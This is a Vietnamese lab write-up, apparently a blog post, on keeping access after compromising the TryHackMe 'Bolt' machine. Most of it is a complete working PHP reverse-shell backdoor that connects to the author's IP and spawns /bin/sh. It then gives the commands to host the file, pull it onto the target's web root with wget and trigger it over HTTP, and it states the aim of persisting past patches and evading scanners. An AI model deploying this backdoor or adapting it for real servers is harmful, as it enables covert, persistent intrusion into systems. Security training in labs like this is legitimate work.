# Basic reverse shell

Bài này sử dụng room Bolt-TryHackMe để thử reverse shell với mục đích là duy trì session sau khi đã hack được vào target machine.

Link Bolt:  https://tryhackme.com/room/bolt

> Vì để ngắn gọn nên mình không viết lại cách tấn công room Bolt mà sẽ để link ở đây cho các bạn tham khảo.

Link wu Bolt: https://github.com/daemon104/Writeups-TryHackMe/tree/main/Bolt

---
## Mục đích và Ý tưởng

Sau khi tấn công thành công 1 target, thường thì hacker sẽ tìm cách để duy trì kết nối đó phục vụ cho nhiều mục đích khác. Có nhiều tác vụ truy cập sâu cần tốn thời gian để chạy hay là phòng khi admin fix lỗ hổng đó rồi thì hacker không thể exploit lại được nữa. Do đó việc duy trì kết nối để sau khi hết phiên vẫn có thể truy cập lại được là rất quan trọng.

Có rất nhiều cách để duy trì kết nối, ở đây mình đề xuất ý tưởng cá nhân của mình, đó là upload file backdoor lên máy target sao cho có thể kích hoạt nó từ phía user (thông qua http website) và khi cần thì kích hoạt file backdoor tạo ra 1 reverse connection về máy mình và cấp 1 shell căn bản cho mình để tiếp tục khai thác mà không cần exploit lại.

---
## Backdoor.php

Sau khi tham khảo nguồn trên mạng, mình đã code lại được 1 file backdoor.php để tạo reverse shell căn bản. Shell này khá cùi vì code mình còn quá cùi nhưng vẫn xài được và có thể privilege escalation lên root để dùng (đỡ hơn không có).

Code mình như thế này:

```php=
<?php

//Required variables
$ip = '10.4.41.207';
$port = 7777;
$cmd = '/bin/sh -i';
$buffer = 2000;

//Change directory to safe directory and unset umask
chdir("/");
umask(0);

//Create reverse connection
$sock = fsockopen($ip, $port, $error_code, $error_message, 100);

//Set file description to STDIN, STDOUT and STDERR
$descriptor_spec = array(
    0 => array("pipe", "r"), 
    1 => array("pipe", "w"),  
    2 => array("pipe", "w")   
);

//Create process running in the target machine, 
//exchanging datas to our machine (input, output, error)
$process = proc_open($cmd, $descriptor_spec, $pipes);

//Set non-blocking for our sockets and pipes 
stream_set_blocking($sock, 0);
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);

//Start to transfer data
while (1) {
    $read_array = array($sock, $pipes[1], $pipes[2]);

    //Input: From our machine to target machine through pipes[0]
    if (in_array($sock, $read_array)) {
        $input = fread($sock, $buffer);
        fwrite($pipes[0], $input);
    }

    //Output: From target machine to our machine through socket
    if (in_array($pipes[1], $read_array)) {
        $output = fread($pipes[1], $buffer);
        fwrite($sock, $output);
    }

    //Error: From target machine to our machine through socket
    if (in_array($pipes[2], $read_array)) {
        $error = fread($pipes[2], $buffer);
        fwrite($sock, $error);
    }

    //Check for end of the connection
    if (feof($sock)){
        break;
    }

    if (feof($pipes[1])) {
        break;
    }
}

//Close connection and process
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

?>
```

## Tiến hành thử nghiệm

Đầu tiên, chúng ta tiến hành khai thác lỗi trên server Bolt như trong wu mình viết. Sau khi khai thác xong RCE, mình sẽ có được shell root như sau:

![](https://i.imgur.com/49JGH9T.png)

Mình sẽ cd tới /var/www/html , đây là đường dẫn chứa web service mặc định mà server đang chạy. Mình sử dụng python để dựng server tại port 8801 để host file backdoor.php:

```
python3 -m http.server --bind 0.0.0.0 8801
```

![](https://i.imgur.com/JU00HGW.png)

Tiến hành upload file backdoor.php lên bằng câu lênh:

```
wget 10.4.41.207:8801/backdoor.php
```

![](https://i.imgur.com/YqGOzWK.png)

Thực thi file từ phia user bằng cách vào trang main page host tại port 80 của server và đi tới đường dẫn file backdoor.php (đừng quên mở trước nc ở port bất kì chỉ định để chờ connection tới):

![](https://i.imgur.com/utBtQzo.png)

![](https://i.imgur.com/sA0AhtK.png)

## Kết quả

Thành công có được shell cơ bản, từ giờ ta có thể nâng cấp quyền lên root và tiến hành khai thác sâu hơn mà không cần tới session của metasploit nữa (trong trường hợp admin phát hiện lỗi và fix nó):

![](https://i.imgur.com/sElUI10.png)

![](https://i.imgur.com/c97EuJs.png)

Có rất nhiều cách để duy trì session và qua mặc các tool scan hay anti backdoor rất hay. Ở đây mình chỉ show ra cách cơ bản nhất để tạo reverse shell trong trường hợp server không chặn truy cập file php từ user hay cài anti reverse.

